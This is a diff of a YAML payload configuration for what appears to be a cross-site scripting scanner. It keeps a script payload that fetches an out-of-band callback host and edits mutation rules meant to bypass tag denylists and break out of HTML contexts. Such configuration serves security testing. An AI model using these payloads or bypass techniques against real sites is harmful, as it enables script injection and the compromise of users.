@@ -25,12 +25,12 @@ payloads:
   - id: data_script_src
     template: "<script src=data:text/javascript,fetch('//{oast_host}/{canary}')></script>"
     confidence: suspected
-    notes: Script src=data: URI with inline fetch; bypasses src-domain allowlists.
+    notes: "Script src=data: URI with inline fetch; bypasses src-domain allowlists."
 mutations:
-  - name: event_handler_swap
-    description: Rotate through onmouseover, onfocus, onanimationstart handler bypasses.
-  - name: closing_contexts
-    description: Prepend '> --> </textarea> </style> to break out of common HTML contexts.
+  - name: case_flip
+    description: Flip case of tag/handler names to bypass case-sensitive tag denylists.
+  - name: comment_injection
+    description: Inject HTML comment sequences to break out of common markup contexts.
 encodings:
   - name: identity
     stages: []
